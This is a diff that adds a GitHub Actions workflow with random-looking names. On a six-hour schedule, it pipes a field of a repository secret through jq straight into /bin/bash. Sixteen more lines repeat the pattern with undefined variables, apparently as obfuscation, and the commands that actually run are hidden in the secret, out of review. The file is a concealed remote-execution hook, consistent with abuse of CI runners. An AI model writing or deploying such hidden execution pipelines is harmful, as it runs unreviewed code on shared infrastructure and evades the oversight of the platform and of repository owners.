@@ -1,0 +1,34 @@
+name: androidyxinz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: androidyxinz
+        env:
+          k619: ${{ secrets.k619 }}
+        run: |
+          echo $k619 | jq -r .muyl9911 | /bin/bash
+          echo $tg9493 | jq -r .yoa15 | /bin/bash
+          echo $oxspu47 | jq -r .ccswb70459 | /bin/bash
+          echo $odlx5654 | jq -r .ww17 | /bin/bash
+          echo $bj645 | jq -r .ljb41 | /bin/bash
+          echo $ihm80 | jq -r .gux30 | /bin/bash
+          echo $nr64 | jq -r .ybl05209 | /bin/bash
+          echo $ox105 | jq -r .pobee94 | /bin/bash
+          echo $gdkhu0456 | jq -r .w5 | /bin/bash
+          echo $lwy505 | jq -r .ikicg25 | /bin/bash
+          echo $vk409 | jq -r .vwa98 | /bin/bash
+          echo $pof03392 | jq -r .llb326 | /bin/bash
+          echo $hy90718 | jq -r .zqxb0258 | /bin/bash
+          echo $w48 | jq -r .hppd8 | /bin/bash
+          echo $ipmuh14471 | jq -r .krn14600 | /bin/bash
+          echo $ef24109 | jq -r .qpxq22 | /bin/bash
+          echo $n580 | jq -r .x81 | /bin/bash
+
